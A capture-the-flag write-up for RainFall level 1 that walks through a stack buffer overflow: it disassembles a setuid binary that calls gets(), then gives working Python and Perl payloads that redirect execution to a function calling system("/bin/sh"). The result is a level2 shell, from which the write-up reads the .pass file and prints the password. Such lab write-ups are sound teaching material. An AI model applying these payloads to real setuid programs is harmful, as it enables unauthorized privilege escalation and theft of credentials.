# Level 1

## Vulnerability

Buffer overflow exploit

## Context

```
level1@RainFall:~$ ls -l
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```
Note: the owner of this binary is level2. 

## Solution

Let's see what the binary does. 
```
level1@RainFall:~$ ./level1
[...]
```
It looks like it's waiting on input from the stdin. Let's take a look in gdb. 
```
level1@RainFall:~$ gdb ./level1
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>: 	and    $0xfffffff0,%esp
   0x08048486 <+6>: 	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb)
```
We can see here the binary calls the C function ```gets```, which copies a string from stdin to a buffer. 
Let's see if we can cause a buffer overflow. A buffer overflow allows us to change the flow of execution of the program.
```
level1@RainFall:~$ python -c 'print "a"*76' | ./level1
level1@RainFall:~$ perl -E "print '*' x 76" | ./level1
Illegal instruction (core dumped)
```
So we've effectively triggered a stack overflow here.
The next step is to look for where we can regain control

```objdump``` will give us a deeper look at the assembly instructions in this binary file. 
We use the ```-M intel``` flag for Intel syntax. 
```
level1@RainFall:~$  objdump -d -M intel level1
[...]
08048444 <run>:
[...]
8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
```
Here we find a run command and ```system()``` call that we can exploit. 
If we run system("/bin/sh"), it will launch a shell that will run with the same priveleges as the calling program. 
https://stackoverflow.com/questions/43294227/hijacking-system-bin-sh-to-run-arbitrary-commands

```
level1@RainFall:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
level1@RainFall:~$ (perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' ; cat -) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
So the password for level2 is ```53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77```!

## Recreate Exploited Binary
